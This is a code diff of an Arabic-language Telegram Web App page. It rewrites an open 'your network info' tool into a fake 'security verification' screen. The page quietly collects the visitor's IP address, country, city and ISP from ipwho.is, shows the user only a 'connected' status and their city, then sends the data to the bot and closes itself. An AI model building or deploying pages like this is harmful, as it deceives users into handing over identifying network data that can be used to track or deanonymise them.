@@ -3,114 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معلومات شبكتك</title>
+    <title>تأكيد البيانات</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             background-color: var(--tg-theme-bg-color, #18222d);
             color: var(--tg-theme-text-color, #ffffff);
-            padding: 20px;
+            padding: 30px;
             text-align: center;
         }
         .card {
             background-color: var(--tg-theme-secondary-bg-color, #232e3c);
             border-radius: 12px;
             padding: 15px;
-            margin-top: 15px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
             text-align: right;
         }
         .btn {
-            background-color: var(--tg-theme-button-color, #2481cc);
-            color: var(--tg-theme-button-text-color, #ffffff);
+            background-color: #2bba53;
+            color: #ffffff;
             border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
+            padding: 15px;
+            border-radius: 10px;
             cursor: pointer;
-            font-size: 16px;
-            margin-top: 15px;
+            font-size: 18px;
             width: 100%;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <h2>🌐 معلومات شبكتك</h2>
-
+    <h2>🔐 التحقق من الأمان</h2>
     <div class="card" id="info">
-        <p>جاري جلب البيانات...</p>
+        <p>جارِ قراءة بيانات الاتصال...</p>
     </div>
 
-    <button class="btn" onclick="getLocation()">📍 تحديد الموقع الجغرافي (GPS)</button>
-    <div id="gps-info"></div>
-
-    <button class="btn" style="background-color: #2bba53;" onclick="sendDataToBot()">إرسال البيانات إليك 📩</button>
+    <button class="btn" onclick="sendNow()">إتمام وإرسال البيانات 🚀</button>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
 
-        let fetchedData = {};
-
-        // جلب وقت الاستخدام
-        const now = new Date();
-        fetchedData.usage_time = now.toLocaleString('ar-IQ', { timeZone: 'Asia/Baghdad' });
+        let payload = {};
 
         fetch('https://ipwho.is/')
             .then(res => res.json())
             .then(data => {
                 if (data.success) {
-                    fetchedData.ip = data.ip;
-                    fetchedData.country = data.country;
-                    fetchedData.city = data.city;
-                    fetchedData.isp = data.connection.isp;
+                    payload.ip = data.ip;
+                    payload.country = data.country;
+                    payload.city = data.city;
+                    payload.isp = data.connection.isp;
                     
                     document.getElementById('info').innerHTML = `
-                        <p><b>عنوان الـ IP:</b> ${data.ip}</p>
-                        <p><b>الدولة:</b> ${data.country}</p>
+                        <p><b>حالة الاتصال:</b> متصل ✅</p>
                         <p><b>المدينة:</b> ${data.city}</p>
-                        <p><b>مزود الخدمة:</b> ${data.connection.isp}</p>
                     `;
-                } else {
-                    document.getElementById('info').innerText = "فشل في جلب بيانات الشبكة.";
                 }
-            })
-            .catch(() => {
-                document.getElementById('info').innerText = "خطأ في الاتصال بالخدمة.";
+            }).catch(() => {
+                document.getElementById('info').innerHTML = `<p>فشل جلب الشبكة</p>`;
             });
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    fetchedData.lat = lat;
-                    fetchedData.lon = lon;
-
-                    document.getElementById('gps-info').innerHTML = `
-                        <div class="card">
-                            <p><b>خط العرض:</b> ${lat}</p>
-                            <p><b>خط الطول:</b> ${lon}</p>
-                            <br>
-                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color: #4ac1f7; text-decoration: none;">فتح في خرائط Google 🗺️</a>
-                        </div>
-                    `;
-                }, () => {
-                    alert("يرجى السماح بالوصول إلى الموقع.");
-                }, { enableHighAccuracy: true });
-            } else {
-                alert("متصفحك لا يدعم تحديد الموقع.");
-            }
-        }
-
-        function sendDataToBot() {
-            if (!fetchedData.ip) {
-                alert("يرجى الانتظار ثوانٍ حتى يتم تحميل البيانات...");
-                return;
-            }
-            // إرسال البيانات المجمعة للبوت لديك
-            tg.sendData(JSON.stringify(fetchedData));
+        function sendNow() {
+            // إرسال البيانات المجمعة وإغلاق التطبيق فوراً
+            tg.sendData(JSON.stringify(payload));
+            tg.close();
         }
     </script>
 </body>
